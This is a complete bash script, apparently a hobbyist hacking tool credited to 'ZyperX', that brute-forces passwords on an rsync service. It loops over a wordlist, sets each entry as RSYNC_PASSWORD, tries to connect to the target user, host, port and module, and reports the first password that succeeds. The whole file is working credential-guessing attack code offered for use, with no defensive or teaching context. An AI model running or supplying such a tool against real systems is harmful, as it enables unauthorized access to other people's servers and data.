#!/bin/bash
if [ $# -lt 5 ];then
 echo -e "\e[34mSyntax : ./rsync_brute.sh <username> <ip> <port> <wordlist> <module_directory>\e[0m"
 exit
fi
banner_som () { echo -e "\e[91m######################################################";
echo -e "\e[34m                 Rsync-service Bruteforcer            ";
echo -e "                      Coded by \e[5mZyperX\e[0m               ";
echo -e "\e[91m######################################################" ;
echo -e "\e[0m";}
for i in $(cat $4);do
 export RSYNC_PASSWORD=$i
 echo "[+]Trying "$i"..."
 rsync rsync://["$1"@"$2"]:"$3"/"$5" > /dev/null 2>&1
 if [ $? -eq 0 ]; then
      echo "[+] Password found:"$i""
      exit
 else
      sleep 0.1
      clear
      banner_som
 fi
done;
